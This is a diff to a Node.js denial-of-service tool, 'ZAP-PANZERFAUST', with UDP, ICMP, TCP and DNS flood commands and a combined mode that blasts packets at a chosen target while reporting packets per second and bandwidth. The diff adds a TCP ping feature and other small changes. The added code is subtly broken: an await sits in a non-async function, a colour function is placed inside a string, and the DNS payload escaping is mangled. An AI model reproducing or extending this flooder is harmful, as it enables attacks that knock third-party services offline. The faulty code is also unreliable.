@@ -1,8 +1,9 @@
-// zap.js - ZAP-PANZERFAUST (L4 TOOL)
 const readline = require('readline');
 const raw = require('raw-socket');
 const dgram = require('dgram');
 const process = require('process');
+const net = require('net');
+const chalk = require('chalk'); // For color effects
 
 const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 
@@ -27,13 +28,23 @@ const stats = {
     maxBPS: 0,
 };
 
+const pingStats = {
+    lastPingTime: Date.now(),
+    pingCount: 0,
+};
+
 async function init() {
     clear();
     console.log("jrl@zap.live >");
-    const cmd = (await prompt("Command > ")).toUpperCase();
+    const cmd = await prompt("Command > ");
+    const command = cmd.toUpperCase();
 
-    const isIRIR = cmd === 'IRIR-PANZERFAUST';
-    if (!["UDP-NUKE", "ICMP-NUKE", "TCP-NUKE", "DNS-NUKE", "IRIR-PANZERFAUST"].includes(cmd)) {
+    if (command === "ZXPING") {
+        return zxping();
+    }
+
+    const isIRIR = command === 'IRIR-PANZERFAUST';
+    if (!["UDP-NUKE", "ICMP-NUKE", "TCP-NUKE", "DNS-NUKE", "IRIR-PANZERFAUST"].includes(command)) {
         console.log("Invalid Command");
         process.exit(1);
     }
@@ -48,9 +59,9 @@ async function init() {
     const endTime = stats.startTime + (duration * 1000);
 
     clear();
-    intervalLog = setInterval(() => printLog(cmd), Math.floor(Math.random() * 2000) + 4000);
+    intervalLog = setInterval(() => printLog(command), Math.floor(Math.random() * 2000) + 4000);
 
-    switch (cmd) {
+    switch (command) {
         case "ICMP-NUKE": return icmpNuke(target, endTime);
         case "UDP-NUKE": return udpNuke(target, udpPort || randomPort(), endTime);
         case "TCP-NUKE": return tcpNuke(target, tcpPort || randomPort(), endTime);
@@ -97,7 +108,6 @@ function udpNuke(target, port, endTime) {
 }
 
 function tcpNuke(target, port, endTime) {
-    const net = require('net');
     const blast = () => {
         if (Date.now() > endTime) return endAttack();
         const client = new net.Socket();
@@ -114,7 +124,7 @@ function tcpNuke(target, port, endTime) {
 
 function dnsNuke(target, port, endTime) {
     const sock = dgram.createSocket("udp4");
-    const buffer = Buffer.from("\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01", 'hex');
+    const buffer = Buffer.from("\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x03www\\x06google\\x03com\\x00\\x00\\x01\\x00\\x01", 'hex');
     const blast = () => {
         if (Date.now() > endTime) return endAttack();
         sock.send(buffer, 0, buffer.length, port, target, (err) => {
@@ -133,6 +143,30 @@ function irirAll(target, uPort, tPort, dPort, endTime) {
     tcpNuke(target, tPort || randomPort(), endTime);
     dnsNuke(target, dPort || 53, endTime);
     icmpNuke(target, endTime);
+}
+
+function zxping() {
+    const ip = await prompt("IP > ");
+    const port = await prompt("Port > ");
+    const ping = setInterval(() => {
+        const start = Date.now();
+        const sock = net.createConnection({ host: ip, port: port }, () => {
+            const end = Date.now();
+            const pingTime = end - start;
+            pingStats.pingCount++;
+            const color = getPingColor(pingTime);
+            console.log(`${color}${ip}:${port} - ${pingTime}ms`);
+        });
+        sock.on('error', (err) => {
+            console.log(chalk.red(`${ip}:${port} - Error: ${err.message}`));
+        });
+    }, 1000);
+}
+
+function getPingColor(time) {
+    if (time < 50) return chalk.green;
+    if (time < 150) return chalk.yellow;
+    return chalk.red;
 }
 
 function printLog(mode) {
@@ -163,7 +197,6 @@ function endAttack() {
     console.log("DENIED: ", stats.lost);
     console.log("MAX PPS: ", stats.maxPPS);
     console.log("MAX BANDWIDTH: ", formatData(stats.maxBPS));
-    process.exit(0);
 }
 
 init();
